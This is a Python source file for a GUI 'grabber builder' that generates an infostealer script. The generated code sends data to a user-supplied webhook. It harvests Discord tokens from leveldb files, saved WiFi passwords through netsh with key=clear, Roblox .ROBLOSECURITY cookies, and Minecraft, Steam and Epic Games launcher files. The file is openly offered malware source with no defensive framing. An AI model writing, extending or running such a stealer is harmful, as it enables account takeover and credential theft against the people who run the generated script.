import os
import tkinter as tk
from tkinter import messagebox, filedialog
from tkinter.scrolledtext import ScrolledText
from ttkbootstrap import Style
from ttkbootstrap.widgets import Checkbutton, Entry, Label, Button, Frame

style = Style("cyborg")
root = style.master
root.title("Mua Grabber Generator - by jsmua50")
root.geometry("750x750")
root.resizable(False, False)

image_path = ""
selected_features_vars = {
    "System Info": tk.BooleanVar(),
    "Discord Info": tk.BooleanVar(),
    "WiFi Info": tk.BooleanVar(),
    "Roblox Info": tk.BooleanVar(),
    "Minecraft Info": tk.BooleanVar(),
    "Valorant Info": tk.BooleanVar(),
    "Steam Info": tk.BooleanVar(),
    "Epic Games Info": tk.BooleanVar(),
}

def on_select_image_button_click():
    global image_path
    image_path = filedialog.askopenfilename(title="Select an image", filetypes=[("Image files", "*.png;*.jpg;*.jpeg;*.gif")])
    if image_path:
        image_label.config(text=f"Selected: {os.path.basename(image_path)}")

def on_build_button_click():
    webhook_url = webhook_entry.get().strip()
    if not webhook_url:
        messagebox.showerror("Error", "Please enter a webhook URL.")
        return

    selected_features = [key for key, var in selected_features_vars.items() if var.get()]
    if not selected_features:
        messagebox.showerror("Error", "Select at least one feature.")
        return

    code = f'''import requests
import os, platform, socket, json, subprocess

webhook = "{webhook_url}"

def send(content):
    requests.post(webhook, json={{"content": content}})

'''

    if "System Info" in selected_features:
        code += '''
def get_system_info():
    info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname())
    }
    return "\\n".join([f"{k}: {v}" for k, v in info.items()])

send("**System Info**\\n" + get_system_info())
'''

    if "Discord Info" in selected_features:
        code += '''
def get_discord_tokens():
    paths = [
        os.getenv("APPDATA") + "\\\\Discord\\\\Local Storage\\\\leveldb",
        os.getenv("APPDATA") + "\\\\discordcanary\\\\Local Storage\\\\leveldb",
        os.getenv("APPDATA") + "\\\\discordptb\\\\Local Storage\\\\leveldb"
    ]
    tokens = []
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    with open(os.path.join(path, file), "r", errors="ignore") as f:
                        for line in f:
                            if "mfa." in line or len(line) > 59:
                                tokens.append(line.strip())
    return "\\n".join(tokens)

send("**Discord Tokens**\\n" + get_discord_tokens())
'''

    if "WiFi Info" in selected_features:
        code += '''
def get_wifi_passwords():
    result = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
    profiles = [line.split(":")[1].strip() for line in result.splitlines() if "All User Profile" in line]
    wifi_info = []
    for profile in profiles:
        details = subprocess.check_output(f"netsh wlan show profile \\"{profile}\\" key=clear", shell=True).decode()
        for line in details.splitlines():
            if "Key Content" in line:
                wifi_info.append(f"{profile}: {line.split(':')[1].strip()}")
    return "\\n".join(wifi_info)

send("**WiFi Info**\\n" + get_wifi_passwords())
'''

    if "Roblox Info" in selected_features:
        code += '''
def get_roblox_cookie():
    roblox_path = os.path.join(os.getenv("LOCALAPPDATA"), "Roblox\\Logs")
    cookies = []
    if os.path.exists(roblox_path):
        for file in os.listdir(roblox_path):
            if file.endswith(".log") or file.endswith(".txt"):
                with open(os.path.join(roblox_path, file), "r", errors="ignore") as f:
                    for line in f:
                        if ".ROBLOSECURITY" in line:
                            cookies.append(line.strip())
    return "\\n".join(cookies)

send("**Roblox Cookies**\\n" + get_roblox_cookie())
'''

    if "Minecraft Info" in selected_features:
        code += '''
def get_minecraft_info():
    path = os.path.join(os.getenv("APPDATA"), ".minecraft\\launcher_profiles.json")
    if os.path.exists(path):
        with open(path, "r") as file:
            return file.read()
    return "No Minecraft data found."

send("**Minecraft Info**\\n" + get_minecraft_info())
'''

    if "Valorant Info" in selected_features:
        code += '''
def get_valorant_info():
    return "Valorant data collection not implemented yet."

send("**Valorant Info**\\n" + get_valorant_info())
'''

    if "Steam Info" in selected_features:
        code += '''
def get_steam_info():
    path = os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam\\config\\loginusers.vdf")
    if os.path.exists(path):
        with open(path, "r") as f:
            return f.read()
    return "Steam info not found."

send("**Steam Info**\\n" + get_steam_info())
'''

    if "Epic Games Info" in selected_features:
        code += '''
def get_epic_info():
    path = os.path.join(os.getenv("LOCALAPPDATA"), "EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini")
    if os.path.exists(path):
        with open(path, "r") as f:
            return f.read()
    return "Epic Games info not found."

send("**Epic Games Info**\\n" + get_epic_info())
'''

    if image_path:
        code += f'\n# Selected image path: {image_path}\n'

    code_output.delete(1.0, tk.END)
    code_output.insert(tk.END, code)

main_frame = Frame(root, padding=20)
main_frame.pack(fill=tk.BOTH, expand=True)

Label(main_frame, text="Mua Grabber Builder", font=("Helvetica", 18, "bold")).pack(pady=(0, 10))
Label(main_frame, text="Enter Webhook URL:").pack(anchor="w")

webhook_entry = Entry(main_frame, width=50)
webhook_entry.pack(pady=(0, 10))

features_frame = Frame(main_frame)
features_frame.pack(pady=10)

for i, (name, var) in enumerate(selected_features_vars.items()):
    cb = Checkbutton(features_frame, text=name, variable=var, bootstyle="success-round-toggle")
    cb.grid(row=i // 2, column=i % 2, sticky="w", padx=10, pady=5)

Button(main_frame, text="Select Image", command=on_select_image_button_click, bootstyle="info").pack(pady=(15, 5))
image_label = Label(main_frame, text="No image selected", bootstyle="secondary")
image_label.pack()

Button(main_frame, text="Build Code", command=on_build_button_click, bootstyle="success-outline").pack(pady=15)

Label(main_frame, text="Generated Code Preview:").pack(anchor="w")
code_output = ScrolledText(main_frame, height=12, font=("Courier New", 10))
code_output.pack(fill=tk.BOTH, expand=True, pady=10)

root.mainloop()
